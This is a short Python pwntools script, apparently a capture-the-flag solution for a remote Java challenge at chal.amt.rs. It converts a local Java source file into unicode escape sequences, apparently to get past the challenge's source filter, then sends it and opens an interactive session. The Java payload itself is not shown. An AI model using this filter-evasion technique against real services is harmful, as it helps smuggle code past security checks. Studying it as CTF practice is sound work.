def unicode_escape(s):
    return "".join(map(lambda c: rf"\u{ord(c):04x}", s))
from pwn import *
context.log_level='debug'
r = remote('chal.amt.rs', 2103)
#r = process(['/usr/bin/python3', 'javaj1_chall.py'])
r.recvuntil(b'--EOF--\n')
payload=unicode_escape(open('javaj1.java').read()).encode()
with open('/tmp/Main.java', 'wb') as f: f.write(payload)
r.sendline(payload)
r.sendline(b'--EOF--')
r.interactive()

